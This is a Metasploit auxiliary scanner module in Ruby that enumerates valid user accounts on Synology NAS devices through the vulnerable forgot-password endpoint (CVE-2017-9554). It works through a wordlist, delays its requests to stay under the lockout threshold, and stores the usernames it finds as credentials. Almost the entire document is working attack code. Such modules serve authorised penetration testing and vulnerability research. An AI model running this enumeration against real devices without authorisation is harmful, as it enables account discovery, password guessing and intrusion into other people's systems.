##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Synology Forget Password User Enumeration Scanner',
        'Description' => %q{
          This module attempts to enumerate users on the Synology NAS
          by sending GET requests for the forgot password URL.
          The Synology NAS will respond differently if a user is present or not.
          These count as login attempts, and the default is 10 logins in 5min to
          get a permanent block.  Set delay accordingly to avoid this, as default
          is permanent.
          Vulnerable DSMs are:
          DSM 6.1 < 6.1.3-15152
          DSM 6.0 < 6.0.3-8754-4
          DSM 5.2 < 5.2-5967-04
        },
        'Author' => [
          'h00die', # msf module
          'Steve Kaun' # POC
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'EDB', '43455' ],
          [ 'CVE', '2017-9554' ],
          [ 'URL', 'https://www.synology.com/en-global/security/advisory/Synology_SA_17_29_DSM' ]
        ],
        'DisclosureDate' => '2011-01-05'
      )
    )

    register_options(
      [
        Opt::RPORT(5000),
        OptString.new('TARGETURI', [true, 'The path to users Synology Web Interface', '/']),
        OptPath.new('USER_FILE', [
          false, 'File containing users, one per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'unix_users.txt')
        ]),
        OptInt.new('DELAY', [true, 'Seconds delay to add to avoid lockout', 36])
      ]
    )
  end

  def run_host(_ip)
    @users_found = {}

    unless File.readable?(datastore['USER_FILE'])
      fail_with(Failure::BadConfig, 'USER_FILE can not be read')
    end
    users = File.new(datastore['USER_FILE']).read.split
    users.each do |user|
      do_enum(user)
      vprint_status("Delaying #{datastore['DELAY']}s") if datastore['DELAY'] > 0 # dont flood the prompt
      Rex.sleep(datastore['DELAY'])
    end

    if @users_found.empty?
      print_status("#{full_uri} - No users found.")
    else
      print_good("#{full_uri} - Users found: #{@users_found.keys.sort.join(', ')}")
      report_note(
        host: rhost,
        port: rport,
        proto: 'tcp',
        sname: (ssl ? 'https' : 'http'),
        type: 'users',
        vhost: vhost,
        data: { users: @users_found.keys.join(', ') }
      )
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user]
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def do_enum(username)
    vprint_status("Attempting #{username}")
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'webman', 'forget_passwd.cgi'),
      'method' => 'GET',
      'vars_get' => {
        'user' => username
      }
    })
    unless res
      print_error('Connection to host refused')
      fail_with(Failure::Unreachable, 'Connection to host refused')
    end
    j = res.get_json_document
    if j['msg'] == 5
      fail_with(Failure::Disconnected, 'You have been locked out.  Retry later or increase DELAY')
    end
    if j['msg'] == 3
      fail_with(Failure::UnexpectedReply, 'Device patched or feature disabled')
    end
    if j['msg'] == 2 || j['msg'] == 1
      print_good("#{username} - #{j['info']}")
      @users_found[username] = :reported
      report_cred(
        ip: rhost,
        port: rport,
        service_name: (ssl ? 'https' : 'http'),
        proof: res.body
      )
    end
    # msg 1 means user can login to GUI
    # msg 2 means user exists but no GUI login
    # msg 3 means not supported/disabled/patched
    # msg 4 means no user
    # msg 5 means auto block is enabled and youre blocked. Default is 10 login attempts, and these
    #     count as lgin attempts.
  rescue Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionError
    print_error('Connection to host refused')
    fail_with(Failure::Unreachable, 'Connection to host refused')
  rescue Timeout::Error, Errno::EPIPE
    fail_with(Failure::Unreachable, 'Connection issue')
  end
end
